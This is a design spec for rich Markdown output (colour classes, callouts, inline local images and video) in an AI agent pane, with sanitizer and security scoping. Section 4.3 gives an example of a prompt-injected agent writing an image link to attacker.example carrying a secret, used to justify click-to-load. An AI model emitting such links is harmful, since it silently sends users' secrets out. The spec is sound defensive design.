# Spec: Rich output in the agent pane (semantic colour, callouts, inline images and video)

**Date:** 2026-09-27
**Status:** active — P1 (semantic colour, §2 and §6) implemented in #3978; P2 (callouts, §3) in #4036; P3 (inline images, §4) implemented; P4 not started
**Author:** agent1
**Scope:**
- `frontend/app/element/markdown*.ts(x)` (the shared renderer)
- `frontend/app/view/agent/components/MarkdownBlock.tsx` (the agent's own messages)
- `agentmux-srv/operator-config-seed.json` (telling agents it exists)
**Verified against:** `main` @ `0fc4123b8`
**Trigger:** the repo owner, 2026-09-27: "if we built out the rendered markdown
with sophisticated coloring (do we have support for images and video?) would you
use it?" followed by "Spec it".

## 0. Summary

Agents write standard Markdown into the agent pane. Today that gives them
headings, bold, tables, code highlighting and Mermaid, but no colour, and no
working images or video. This spec adds four things, each of which degrades to
plain, readable text outside AgentMux (GitHub, a terminal, another renderer):

1. **Semantic colour:** `<span class="am-ok">…</span>` and a small, fixed set of
   meaning-based classes (§2). The theme decides the actual colours.
2. **Callouts:** GitHub's alert syntax, `> [!WARNING]` and friends (§3). GitHub
   already renders it natively.
3. **Inline images from local files:** `![alt](path/to/shot.png)` in an agent's
   own message (§4).
4. **Inline video and audio from local files:** the same image syntax with a
   video or audio extension, `![repro](recording.mp4)` (§5).

Plus the step that makes any of it used: an Operator Config entry that tells
every agent the syntax (§6). Agents don't discover renderer features on their
own; they write what their instructions say.

**Non-goals.**
- Free-form colours (`style="color:#…"`, arbitrary classes).
- Remote video.
- Changing how tool results, file previews or the editor render. The new
  media support is scoped to the agent's own messages (§4.1).

## 1. What exists today

Verified in code at the baseline.

| Capability | Today | Where |
|---|---|---|
| Markdown, GFM tables, code highlighting | ✅ | `markdown.tsx`: `remark-gfm`, `rehype-highlight`, `TableBlock` |
| Mermaid | ✅ | `markdown-mermaid.tsx`, `remark-mermaid-to-tag` |
| Raw HTML | ✅, sanitized | `rehype-raw`, then `rehype-sanitize` with `defaultSchema`, plus `span`, `picture`, `source`, `waveblock`, `mermaidblock` (`markdown.tsx:418-452`) |
| Coloured text | ❌ | The sanitizer keeps no `style` attribute, and `span` may carry only `className` matching `/^hljs-./` (the syntax-highlighter's own classes) |
| Callouts (`> [!NOTE]`) | ❌ | Rendered as a plain blockquote with a literal `[!NOTE]` |
| Images | ❌ in practice | See the note below. |
| Video / audio in Markdown | ❌ | `<video>`/`<audio>` aren't in the sanitizer allowlist. Video plays only in the Media pane (`view/media/media.tsx`). |

**Why images don't work.** `MarkdownImg` (`markdown-media.tsx`) renders a
`data:` URI directly. Anything else goes through `resolveOpts`, and **no caller
anywhere in the app passes `resolveOpts`**, so every other image renders as the
text `[img:<src>]`. That includes plain `https://` URLs. The resolver it would
have used, `resolveRemoteFile` (`markdown-util.ts:157`), builds a
`/agentmux/stream-file` URL, and srv routes that path to `stub_501`
(`agentmux-srv/src/server/mod.rs:493`). So that whole path is dead code, not a
disabled feature.

**What does work:** the Media pane. It fetches
`/agentmux/stream-local-file?path=…` with the `X-AuthKey` header, then hands
`<img>`/`<video>`/`<audio>` a blob object URL (`media.tsx`, `fetchMediaBlob`).
A plain `src=` can't send the header, and the query-string auth fallback is
restricted to `/ws` on purpose. srv's `handle_stream_local_file`
(`agentmux-srv/src/server/files.rs:199`) serves any regular file up to 500 MB,
with no extension check.

**Colour tokens already in the theme** (`frontend/app/theme.scss`):
- `--success-text-color`, `--warning-text-color`, `--error-text-color`
- `--info-color`, `--accent-color`, `--secondary-text-color`

## 2. Semantic colour

### 2.1 The vocabulary

A closed set, small enough to remember and each tied to a meaning:

| Class | Meaning | Colour (theme var) |
|---|---|---|
| `am-ok` | passed, done, healthy | `--success-text-color` |
| `am-warn` | needs attention, partial, flaky | `--warning-text-color` |
| `am-error` | failed, broken, blocking | `--error-text-color` |
| `am-info` | neutral highlight, a note | `--info-color` |
| `am-muted` | de-emphasised: stale, skipped, out of scope | `--secondary-text-color` |
| `am-added` | added in a comparison | `--success-text-color`, faint green background |
| `am-removed` | removed in a comparison | `--error-text-color`, faint red background, strike-through |

One modifier:

| Class | Effect |
|---|---|
| `am-badge` | A rounded pill: a small caps label with a tinted background in the colour class it's combined with. `<span class="am-badge am-error">P1</span>` is a red pill. Alone it's a neutral grey pill. |

Syntax, always a `span`:

```html
<span class="am-ok">All 387 tests pass</span>
<span class="am-badge am-warn">needs repro</span> #2873 — tear-off over a floater
```

Colour never carries meaning on its own. The words must still say it ("passes",
"needs repro"), so the text reads correctly without colour: on GitHub, for
colour-blind readers, and in a transcript.

### 2.2 Sanitizer

In `markdown.tsx`'s `rehypeSanitize` schema, `span`'s `className` rule changes
from the prefix regex to the syntax-highlighter prefix **or** an exact allowlist:

```ts
const AM_SPAN_CLASSES = ["am-ok", "am-warn", "am-error", "am-info", "am-muted",
                         "am-added", "am-removed", "am-badge"] as const;
// span: ["className", /^hljs-./, ...AM_SPAN_CLASSES]
```

`hast-util-sanitize` keeps a class token if it matches any listed value, so
unknown `am-*` tokens are dropped, as is anything else. No `style` attribute
and no other tag becomes allowed. The allowlist lives in one exported constant,
which the tests, the SCSS and the Operator Config text (§6) all reference.

This applies to every `<Markdown>` consumer, not just agent messages.
Colour is harmless in a file preview or the editor, and one renderer is simpler
than two.

### 2.3 Styles

In `markdown.scss`, under `.markdown`, one rule per class, using the theme
variables above:
- Backgrounds are a `color-mix()` tint of the same variable (about 15%), so
  light and dark themes both work without extra variables.
- `am-badge` gets `padding: 0 0.45em; border-radius: 0.6em; font-size: 0.85em;
  font-weight: 600; white-space: nowrap`.

### 2.4 Streaming

Agent text streams in. A `<span class="am-ok">` whose closing tag hasn't
arrived yet must not flash raw markup, or break the rest of the block. The
incremental renderer already splits streamed text at a safe point
(`findSafeSplitPoint`, `markdown-incremental.ts`). A test must cover a span cut
mid-tag and mid-content (§8). If the safe-split logic doesn't treat an open
inline HTML tag as unsafe, extend it to.

## 3. Callouts

GitHub's alert syntax, which GitHub itself renders, so the same text works in a
PR body:

```markdown
> [!WARNING]
> Closing this issue removes the only record of the repro steps.
```

The five GitHub kinds: `NOTE` (info), `TIP` (ok), `IMPORTANT` (accent),
`WARNING` (warn) and `CAUTION` (error).

**Implementation.** A small remark plugin (about 40 lines, no new dependency)
turns a blockquote whose first paragraph starts with `[!KIND]` into
`<div class="markdown-alert markdown-alert-<kind>">` with a title row. The
sanitizer allows `div` with exactly those classes. Unknown kinds stay plain
blockquotes. This works in every `<Markdown>` consumer.

**As built (P2).** `frontend/app/element/remark-github-alerts.ts`. As on
GitHub, the marker must be alone on the blockquote's first line and is
case-insensitive; a marker followed by text on the same line, or mid-sentence,
stays a plain blockquote. While streaming, a callout whose body hasn't arrived
yet renders as its title alone, never as the literal `[!KIND]`. Each kind sets
one `--alert-color` in `markdown.scss`, from which the left rule, tint and
title colour are drawn.

## 4. Inline images (the agent's own messages)

### 4.1 Where it's enabled

Only in `MarkdownBlock`, the agent's own assistant text. It stays off in:
- tool results and file previews (`tool-renderers/builtins.tsx`'s
  `FilePreview`, `SearchResults.tsx`);
- skills, memory editors, the editor preview, and modals.

**Why the scope.** Tool results carry content the agent didn't write: a file
under review, a web page, a search result. An image reference there would make
the pane fetch something because of untrusted text. The agent's own message is
the one surface where an image is there because the agent chose to show it.

This is a new, opt-in prop on `<Markdown>` (`media={{ baseDir }}`), passed only
by `MarkdownBlock`. `baseDir` is the agent's working directory, the same one
`agent-view.tsx` already resolves (`block.meta["cmd:cwd"]`, else the
definition's `working_directory`).

The existing dead `resolveOpts` / `resolveRemoteFile` / `/stream-file` path is
**removed**, not revived. The spec replaces it.

### 4.2 Local files

**Paths.**
- `![alt](path)` where `path` is absolute (`C:/…`, `/…`, `~/…`) or relative to
  `baseDir`.
- Forward slashes are recommended. Wrap the path in `<…>` if it has spaces,
  which is standard CommonMark.

**Allowed types.** Extension allowlist: `png`, `jpg`, `jpeg`, `gif`, `webp` and
`svg`. Only `png`, `jpg`, `jpeg`, `gif` and `webp` are in `IMAGE_EXTENSIONS`
(`view/media/media.tsx`) today; `svg` is new.
- SVG is loaded via `<img>` from a blob URL, so its scripts never run.
- Anything else renders the text `[image: <path> — unsupported type]` and makes
  no request.

**Loading.** Reuse the Media pane's path: fetch `stream-local-file` with
`X-AuthKey`, then a blob object URL, revoked on unmount.
- Move `fetchMediaBlob` out of `media.tsx` into a shared module
  (`frontend/app/element/local-media.ts`) that both use.
- Loading is lazy: the fetch starts when the row nears the viewport, via an
  `IntersectionObserver` on the placeholder.
- The client caps images at **25 MB**. Above that, the pane shows a link card
  instead: file name, size, and "open in Media pane".

**Display.**
- `max-width: 100%`. `max-height: min(60vh, 640px)`, larger than the tool-output
  preview cap, because an image an agent chose to show is the content, not a
  preview.
- `object-fit: contain`, with the alt text as the caption below.
- Clicking opens the file in a Media pane, using the same action as the
  `OpenMedia` tool.
- A missing file, or a failed fetch, shows `[image not found: <path>]` in
  `am-muted`, not a broken-image icon.

**Row height and scroll-follow.** An image loading late grows its row. This
must go through the existing resize contract (`beginHeightContinuity`,
`SPEC_CONTENT_RESIZE_CONTRACT_2026_08_31.md`), and must not unpin
scroll-follow. #3655 tracks that area, and #3652 made a shrink harmless.
- Reserve space while loading: a 16:9 placeholder at the display max-width.
- Once the image's natural size is known, set the element's `aspect-ratio`
  before swapping the image in, so the row settles once.

### 4.3 Remote images

`https://` images **don't load automatically.** They render a chip,
`🌐 image from <host> — load`, and the image loads only after a click.
`http://` gets the same chip, plus a note that the connection isn't encrypted.

**Why.** An agent can be steered by the content it reads (prompt injection) into
writing `![x](https://attacker.example/?d=<secret>)`. Auto-loading that sends
the data out the moment the message renders, with no click and no visible sign.
This is a well-known attack on chat UIs that render Markdown. Click-to-load
keeps the feature and removes the silent part.

`data:image/*` URIs keep rendering directly, as today; they make no request.

### 4.4 As built (P3)

- `frontend/app/element/local-media.ts` holds what the Media pane and inline
  media share: the extension lists, `fetchMediaBlob` (now with `maxBytes`,
  checked against `Content-Length` before the body is read), `describeMediaError`,
  and `resolveMediaPath`. `markdown-media.tsx` renders images; the agent pane
  provides the working directory through `agent-media.tsx` (a context, like
  `agent-dormancy.tsx`), which `MarkdownBlock` turns into `<Markdown media>`.
- **Sanitizer findings.** hast-util-sanitize allows only `http`/`https` in an
  image `src`, so `C:/…` (read as a `C:` scheme) and `data:` were both stripped
  before any component saw them; `data:` images had never rendered, despite
  §4.3's "as today". `rehype-local-image-src.ts` rewrites a drive path to
  `file:///…`, and `src` now also allows `file` and `data` (only `MarkdownImg`
  decides what's fetched). A `data:` image renders only where `media` is on,
  and only as a raster type: an SVG can reference remote resources, so an
  inline SVG data URI never renders (ReAgent P0 on #4064). `<picture>`/`<source>` came from the default
  allowlist too; they're now filtered out, so a remote `srcset` can't load
  beside a local image.
- **Network paths are refused** (Codex P1 on #4064): a UNC path (`//host/…`,
  `\host\…`, `file://host/…`) would make Windows open an SMB connection to
  that host, with no click, so it renders `[image: … — network paths aren't
  loaded]` and makes no request.
- **SVG in the Media pane** (Codex P2): `IMAGE_EXTENSIONS` now includes `svg`,
  so clicking an inline SVG opens a pane that shows it (still via `<img>`).
- **Row height.** The placeholder is 16:9 until the natural size is known; the
  swap goes through `withHeightContinuity`. Decoding is awaited for at most
  1.5 s, so a very large image shows without a known ratio rather than never.
  Known ratios are cached by path, so a remounted row reserves the right height.
  `estimateMarkdown` reserves 360 px per local image (up to three).
- The `parse-srcset` dependency is now unused; removing it (a lockfile change)
  is left to a separate cleanup.

## 5. Inline video and audio (the agent's own messages)

Same syntax, same scope, same loading path, keyed by extension:

| Extension | Element |
|---|---|
| `mp4`, `webm`, `mov` | `<video controls preload="metadata">` |
| `wav` | `<audio controls preload="metadata">` |

These are the Media pane's `VIDEO_EXTENSIONS` and `AUDIO_EXTENSIONS`, imported,
not copied.

- **Nothing autoplays.** Video starts muted when played, with inline controls.
- **Size cap:** 200 MB client-side, well under srv's 500 MB. Above it, a link
  card that opens the Media pane.
- **Loading:** the blob is fetched only when the user presses play. Before that,
  the element shows a poster frame from the first ~2 MB, fetched with a `Range`
  request.
- **`Range` doesn't exist yet.** `handle_stream_local_file` always returns the
  whole file as a `ReaderStream` with `Content-Length`, and ignores `Range`
  (`files.rs:199` onward). P4 adds `206 Partial Content` support: seek the
  opened file and wrap it in `take(len)`. That's cheap on the existing
  streamed read. Until then, the fallback is a neutral placeholder with the
  file name and size.
- **Codec failures** use the Media pane's `describeMediaError`, which is also
  moved to `local-media.ts`. H.264 MP4 needs the proprietary-codec CEF build,
  and the error must say that rather than "failed".
- **Remote video** isn't supported. An `https://…mp4` renders as a plain link.
- **Row height:** the same reserved 16:9 placeholder as §4.2.

On GitHub, `![repro](recording.mp4)` shows as a broken image with alt text
"repro". That's acceptable degradation. Agents are told (§6) not to use this in
PR bodies.

## 6. Telling agents: an Operator Config entry

A third entry in `agentmux-srv/operator-config-seed.json`. It is seeded into
Global Memory and composed into every agent's startup instructions, like the
two existing entries (`operator_config_seed.rs`). The manifest `version` goes
from 1 to 2, which re-seeds unedited entries.

```json
{
  "id": "operator-config-rich-output",
  "name": "[AgentMux System] AgentMux Operator Config: Rich output in the agent pane",
  "content": "..."
}
```

The content should stay under about 40 lines and cover:
- The seven colour classes and `am-badge`, with one example each. The rule:
  **the words carry the meaning; colour only reinforces it.**
- Callout syntax, and the five kinds.
- Images, video and audio, with paths absolute or relative to the working
  directory, forward slashes, and `<…>` for spaces.
- Where to use it: **replies in the AgentMux pane only.** Not in files, commits,
  PR bodies or issue comments, with one exception: callouts, which GitHub
  renders.
- Restraint: use colour for status and comparison, a handful of spans per
  reply at most, and never whole paragraphs. Use inline images when showing is
  clearer than telling: a screenshot of a UI change, a before/after, a chart.

The text must be accurate on the day it ships. Add each phase's syntax to the
entry in the same PR that makes it render, not before.

## 7. Phasing

Each phase is its own PR and is independently useful.

| Phase | Contents | Size |
|---|---|---|
| **P1** | §2: colour classes and badge. The sanitizer allowlist, SCSS, and streaming safety. Operator Config entry v2 with the colour section. | small |
| **P2** | §3: callouts. The remark plugin, sanitizer, SCSS. Add the syntax to the entry. | small |
| **P3** | §4: local images in agent messages. `local-media.ts` extracted from the Media pane; `media` prop; lazy load; placeholder and aspect-ratio settling; click to open in Media. Remove dead `resolveOpts`/`/stream-file`. Remote click-to-load chip. Add to the entry. | medium |
| **P4** | §5: video and audio. `Range` support on `stream-local-file` if missing. Add to the entry. | medium |

## 8. Tests

**P1**
- Sanitizer: each `am-*` class survives, and `am-bogus`, `style=` and
  `onclick=` are stripped.
- `hljs-*` still survives, so there's no highlighting regression.
- A streamed `<span class="am-ok">pa` renders no raw `<span`, and completing it
  renders the span.
- An SCSS pin test (same style as `styles/tool-panel-height.test.ts`) confirms
  each class maps to its theme variable.

**P2**
- Each of the five kinds renders the right class and title.
- `[!UNKNOWN]` stays a blockquote.
- A blockquote whose first line only mentions `[!NOTE]` mid-sentence is
  unchanged.

**P3**
- A relative path resolves against `baseDir`, and an absolute path is used
  as-is.
- `.exe`/`.txt` makes no fetch.
- Fetches carry `X-AuthKey`.
- Blob URLs are revoked on unmount.
- An `https://` image makes no request until clicked.
- `FilePreview` and tool results never render an `<img>` for a local path (the
  scope from §4.1).
- The virtual-list estimate: a row with a loading image doesn't unpin follow.
  Reuse the harness in `AgentDocumentVirtualList.cap-resize.test.tsx`.

**P4**
- The extension decides `<video>` vs `<audio>` vs image.
- No fetch before play.
- The codec-error message comes from `describeMediaError`.

**Live check** for each phase: a dev build, an agent asked to reply with each
construct, and a screenshot of the pane.

## 9. Open questions

1. **Poster frames (P4).** Is `Range` support on `stream-local-file` worth it
   just for a poster frame? It also lets `<video>` seek without fetching the
   whole file, which argues yes. The alternative is a name-and-size placeholder
   until the user presses play.
2. **Scope creep toward tool results.** Should a Read of a `.md` file ever show
   that file's own images, relative to the file? It's useful for reviewing
   docs, but it's untrusted content (§4.1). Not in this spec. If wanted, local
   files only, with the same allowlist and caps, as its own decision.
3. **Other providers.** Codex, Gemini and others render in the same pane and
   receive Global Memory when their provider supports startup instructions (Kimi
   doesn't today). No provider-specific work is needed, but whether a given
   model follows the entry's guidance should be checked per provider when P1
   ships.
